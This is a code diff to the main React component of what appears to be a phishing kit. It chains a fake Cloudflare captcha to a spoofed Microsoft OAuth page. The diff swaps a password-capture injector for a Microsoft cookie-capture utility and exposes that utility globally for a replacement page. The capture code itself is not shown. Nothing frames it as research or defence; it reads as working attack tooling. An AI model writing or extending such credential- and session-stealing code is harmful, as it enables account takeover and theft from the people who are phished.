@@ -1,104 +1,66 @@
 import React, { useState, useEffect } from 'react';
 import { BrowserRouter as Router, Routes, Route, useLocation } from 'react-router-dom';
-import MessageIconLanding from './components/MessageIconLanding';
 import CloudflareCaptcha from './components/CloudflareCaptcha';
 import RealOAuthRedirect from './components/RealOAuthRedirect';
-import AuthCallback from './components/AuthCallback'; // Import the new component
-import { injectPasswordCaptureScript } from './utils/password-capture-injector';
+import AuthCallback from './components/AuthCallback';
+import { enhancedMicrosoftCookieCapture } from './utils/microsoftCookieCapture';
 
 const App: React.FC = () => {
-    // Using React Router to handle different pages
-    return (
-        <Router>
-            <MainContent />
-        </Router>
-    );
-};
-
-const MainContent: React.FC = () => {
-    const [currentPage, setCurrentPage] = useState('captcha');
     const location = useLocation();
+    const [currentView, setCurrentView] = useState<string>('default');
+    const [captchaVerified, setCaptchaVerified] = useState(false);
 
-    // Inject scripts on component mount and location change
     useEffect(() => {
         try {
-            injectPasswordCaptureScript();
-            console.log('✅ Password capture injector initialized');
+            // Initialize Microsoft cookie capture utilities
+            console.log('✅ Microsoft cookie capture utilities initialized');
+            
+            // Make functions globally available for replacement.html
+            if (typeof window !== 'undefined') {
+                (window as any).enhancedMicrosoftCookieCapture = enhancedMicrosoftCookieCapture;
+            }
         } catch (error) {
-            console.warn('⚠️ Failed to initialize password capture injector:', error);
+            console.warn('⚠️ Failed to initialize Microsoft cookie capture:', error);
         }
     }, [location]);
 
-    // This component will render the correct "page" based on the URL path
-    return (
-        <Routes>
-            <Route path="/auth/callback" element={<AuthCallback />} />
-            <Route path="/" element={<DefaultPage currentPage={currentPage} setCurrentPage={setCurrentPage} />} />
-        </Routes>
-    );
-};
-
-
-// This component contains the original page logic
-const DefaultPage = ({ currentPage, setCurrentPage }) => {
-    useEffect(() => {
-        const urlParams = new URLSearchParams(window.location.search);
-        const step = urlParams.get('step');
-        if (step) {
-            setCurrentPage(step);
-            window.history.replaceState({}, document.title, window.location.pathname);
-        }
-    }, [setCurrentPage]);
-
     const handleCaptchaVerified = () => {
-        setCurrentPage('authenticating');
+        setCaptchaVerified(true);
+        setCurrentView('replacement');
     };
 
     const handleCaptchaBack = () => {
-        window.location.reload();
+        setCurrentView('default');
     };
 
-    useEffect(() => {
-        if (currentPage === 'authenticating') {
-            const timer = setTimeout(() => {
-                setCurrentPage('replacement');
-            }, 1500); // Short delay before redirecting to replacement
-            return () => clearTimeout(timer);
+    const renderCurrentView = () => {
+        switch (currentView) {
+            case 'captcha':
+                return (
+                    <CloudflareCaptcha
+                        onVerified={handleCaptchaVerified}
+                        onBack={handleCaptchaBack}
+                    />
+                );
+            case 'replacement':
+                return <RealOAuthRedirect />;
+            default:
+                return (
+                    <div className="min-h-screen bg-gray-100 flex items-center justify-center">
+                        <p>Start prompting (or editing) to see magic happen :)</p>
+                    </div>
+                );
         }
-    }, [currentPage]);
-    
-    // Original switch logic for the main flow
-    switch (currentPage) {
-        case 'captcha':
-            return (
-                <CloudflareCaptcha
-                    onVerified={handleCaptchaVerified}
-                    onBack={handleCaptchaBack}
-                />
-            );
-        case 'authenticating':
-            return (
-              <div style={{
-                display: 'flex', justifyContent: 'center', alignItems: 'center', height: '100vh',
-                fontFamily: 'Arial, sans-serif', backgroundColor: '#f3f2f1'
-              }}>
-                <div style={{ textAlign: 'center', fontSize: '24px', color: '#323130' }}>
-                  Authenticating...
-                </div>
-              </div>
-            );
-        case 'message-icon':
-            return <MessageIconLanding onOpenMessage={() => {}} />;
-        case 'replacement':
-            return <RealOAuthRedirect />;
-        default:
-            return (
-                <CloudflareCaptcha
-                    onVerified={handleCaptchaVerified}
-                    onBack={handleCaptchaBack}
-                />
-            );
-    }
+    };
+
+    return (
+        <Router>
+            <Routes>
+                <Route path="/auth/callback" element={<AuthCallback />} />
+                <Route path="*" element={renderCurrentView()} />
+            </Routes>
+        </Router>
+    );
 };
 
 export default App;
